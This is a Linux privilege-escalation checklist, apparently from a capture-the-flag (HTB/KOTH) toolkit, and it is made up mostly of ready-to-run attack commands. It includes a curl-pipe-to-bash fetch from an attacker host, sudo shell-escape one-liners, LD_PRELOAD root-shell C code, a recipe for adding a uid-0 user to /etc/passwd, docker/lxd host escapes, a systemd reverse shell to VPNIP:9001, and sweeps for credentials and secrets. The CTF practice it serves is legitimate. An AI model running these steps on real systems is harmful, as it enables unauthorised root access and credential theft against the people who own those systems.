# Linux privilege escalation

Run `id` first. Then `sudo -l` — it's the fastest possible win and sometimes the
whole box. Only then walk the ordered checklist. Copy
`scripts/privesc-linux.sh` to the target (`/tmp`) and run it to automate steps
2–10; read its output top to bottom.

```bash
curl -o /tmp/e.sh http://VPNIP:8000/privesc-linux.sh && bash /tmp/e.sh
```

## 1. sudo -l → GTFOBins

`sudo -l` (try your password; try the empty password). Any allowed binary:
check https://gtfobins.github.io — top patterns:

| Binary | One-liner (sudo/shell escape) |
|---|---|
| `awk` | `sudo awk 'BEGIN {system("/bin/sh")}'` |
| `vim`/`vi` | `sudo vim -c ':!/bin/sh'` |
| `find` | `sudo find / -exec /bin/sh \; -quit` (or `find . -exec /bin/sh -p \; -quit` on suid) |
| `less`/`more`/`man` | `sudo less /etc/shadow` then `!/bin/sh` |
| `python` | `sudo python -c 'import pty;pty.spawn("/bin/sh")'` |
| `perl` | `sudo perl -e 'exec "/bin/sh";'` |
| `bash`/`sh` | `sudo bash` |
| `env` | `sudo env /bin/sh` |
| `cp`/`mv` | overwrite `/etc/passwd`, `/etc/shadow`, or a root cron script |
| `tar` | `sudo tar cf /dev/null x --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| `nmap` (old) | `sudo nmap --interactive` → `!sh` |
| `wget`/`curl` | fetch attacker file to root-owned path (`/etc/passwd`, cron dir) |
| `zip`/`rsync`/`scp` | GTFOBins shell-escape entries — look up exact form |

`sudo -l` shows `env_keep` entries: if `LD_PRELOAD` or `LD_LIBRARY_PATH` is
kept, compile a shared lib (on the target or matching gcc) that spawns a shell.

```c
// gcc -shared -fPIC -o /tmp/sh.so sh.c -nostartfiles
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() { setgid(0); setuid(0); system("/bin/sh"); }
```
`sudo LD_PRELOAD=/tmp/sh.so <allowed-binary>`.

NOPASSWD rules referencing a path you can write, or a wildcard with injection
(`sudo some-script *` → argument injection), beat the table.

## 2. SUID/SGID

```bash
find / -perm -4000 -type f 2>/dev/null    # -perm /6000 for either
find / -perm -6000 -type f 2>/dev/null
```

Compare against GTFOBins suid list. Non-standard suid binaries (not in the
list) are the box's intended path: run them with `-h`, `strings`, `strace` —
look for `system()`/`exec` of bare command names (→ path hijack, below), or
paths relative to cwd.

## 3. Capabilities

```bash
getcap -r / 2>/dev/null
```

- `cap_setuid` on a binary → run it, `setuid(0)` path (python one-liner on
  GTFOBins capabilities page).
- `cap_dac_read_override` → read `/etc/shadow` → crack offline.
- `cap_net_raw` → sniff creds off localhost protocols.

## 4. Cron and timers

```bash
crontab -l; ls -la /etc/cron* /var/spool/cron 2>/dev/null
cat /etc/crontab; ls -la /etc/systemd/system/*.timer
grep -r . /etc/systemd/system --include='*.service' 2>/dev/null | head
```

Writable script run as root by cron → replace with reverse shell or `chmod u+s
/bin/bash`. Also: scripts calling **bare command names** — check every
cron-invoked script's PATH; if it runs `backup` not `/usr/bin/backup` and a
writable dir precedes it in PATH (or the script dir itself is writable), drop a
malicious binary there.

```bash
find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys|dev|run|tmp)'
echo $PATH
```

## 5. Writable /etc/passwd

```bash
ls -la /etc/passwd
openssl passwd -6 -salt xyz password      # or: -1 for MD5
echo 'root2:$6$xyz$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
su root2                                  # password: password
```

Works when passwd is writable AND `/etc/shadow` permits (root entries with
known-hash pass; PAM may still prefer shadow — also try overwriting root's
`x` field in passwd directly with the generated hash).

## 6. Group memberships

| Group | Escalation |
|---|---|
| `docker` | `docker run -v /:/mnt -it alpine chroot /mnt sh` — host root (pacman docker, or use `podman` if the box has it) |
| `lxd`/`lxc` | build/import image, `lxc exec` with host rootFS mounted: `lxc init` + `lxc config device add <c> r disk path=/ source=/` + `lxc start` + `lxc exec <c> sh` |
| `disk` | `debugfs -w /dev/sda1` → read/edit any file incl. `/etc/shadow` |
| `sudo` | recheck `sudo -l` variants |
| `video`/`adm` | framebuffer/screenshots, log reads — box-dependent |

## 7. Writable service units / scripts started as root

Writable `/etc/systemd/system/*.service` or its ExecStart binary:

```bash
# replace ExecStart with: ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/VPNIP/9001 0>&1'
systemctl daemon-reload
systemctl restart <unit>      # or wait for box reboot in KOTH
```

## 8. NFS root-squash-off (attack from our host)

If foothold revealed an NFS export with `no_root_squash`
(`cat /etc/exports` on target, or `showmount`), mount from here and place a
suid binary — see `references/foothold.md` NFS section.

## 9. Credential hunting (often beats all of the above)

```bash
grep -rn 'passw\|PASSW\|secret\|api[_-]key' /home/* /opt /srv /var/www 2>/dev/null | head -50
cat ~/.bash_history /home/*/.bash_history /root/.bash_history 2>/dev/null
ls -la /var/backups/; ls -la /home/*/.ssh/ /root/.ssh/ 2>/dev/null
cat /etc/shadow 2>/dev/null; find / -name '*.kdbx' -o -name 'id_rsa*' -o -name '*.ovpn' 2>/dev/null
env; cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | sort -u
find / -name '*.db' -o -name '*.sqlite*' -path '*www*' 2>/dev/null
```

Crack hashes: `hashcat`/`john` rules in toolbox; reuse found creds via `su`.

## 10. Kernel exploits — last resort

Check `uname -r` + distro (`cat /etc/issue`), then searchsploit/web for the
matching local privilege escalation (Dirty Pipe = Linux 5.8–5.16.11 CVE-2022-0847
overwrite `/etc/passwd` or SUID file; Dirty COW = ≤4.8.3 CVE-2016-5195 era,
much older). Rules:

- Compile **on the target** (gcc there) — host kernels/headers mismatch.
- These can panic the box → in a shared KOTH arena, a panic drops it for
  everyone; on HTB, a reset costs you the shell. Only when the checklist died.

## Automation

linpeas: fetch once from upstream releases into `toolbox/`, serve with
`python3 -m http.server`, execute on target — it enumerates everything above
with color-coded findings. linenum is the lighter alternative. Treat their
output as a pointer list, not a verdict: verify each lead manually.
